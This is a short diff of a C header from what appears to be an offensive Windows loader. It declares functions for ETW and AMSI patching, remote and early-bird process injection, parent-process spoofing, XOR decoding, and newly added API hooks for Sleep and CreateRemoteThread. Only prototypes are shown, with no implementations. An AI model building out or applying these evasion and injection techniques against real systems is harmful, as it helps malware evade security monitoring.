@@ -14,8 +14,19 @@ void etwPatch();
 void amsiPatch();
 int ntTestInject();
 void RemoteInject();
+void NTinject();
 void threadPool();
 void earlybird(PROCESS_INFORMATION pi);
 PROCESS_INFORMATION ppid(SIZE_T attributeSize, STARTUPINFOEX six);
 //HANDLE FindThread(int pid);
 void XOR(char* data, size_t data_len, char* key, size_t key_len);
+
+void HookedSleep(DWORD dwMilliseconds);
+HANDLE HookedCreateRemThr(HANDLE                 hProcess,
+	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+	SIZE_T                 dwStackSize,
+	LPTHREAD_START_ROUTINE lpStartAddress,
+	LPVOID                 lpParameter,
+	DWORD                  dwCreationFlags,
+	LPDWORD                lpThreadId);
+BOOL Hookem(char* dll, char* origFunc, PROC hookingFunc);
